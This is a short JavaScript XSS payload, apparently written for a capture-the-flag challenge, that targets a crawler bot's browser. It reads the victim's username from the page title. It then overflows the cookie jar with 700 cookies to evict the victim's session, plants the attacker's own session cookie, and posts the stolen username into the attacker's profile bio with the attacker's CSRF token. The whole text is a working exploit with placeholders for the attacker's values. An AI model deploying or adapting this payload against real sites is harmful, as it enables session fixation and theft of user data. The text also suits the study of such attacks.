//send request to / => get the crawler's username
var result;
xhr = new XMLHttpRequest();
xhr.open('GET', '/');
xhr.onreadystatechange = function() {
    result = xhr.responseText;
    dom = new DOMParser();
    result_parsed = dom.parseFromString(result, 'text/html');
    title = result_parsed.title; //The title contains the crawler's username

    //overwrite crawler's session cookie => my session cookie
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}`;
    }
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
    document.cookie = 'session=<my_session_cookie>;path=/';

    //Update my bio with my csrf_token
    xhr_2 = new XMLHttpRequest();
    xhr_2.open('POST', '/api/user/update');
    xhr_2.withCredentials = true;
    xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr_2.send("bio=asdTitle:" + title + "&csrf_token=<my_csrf_token>");
}
xhr.send();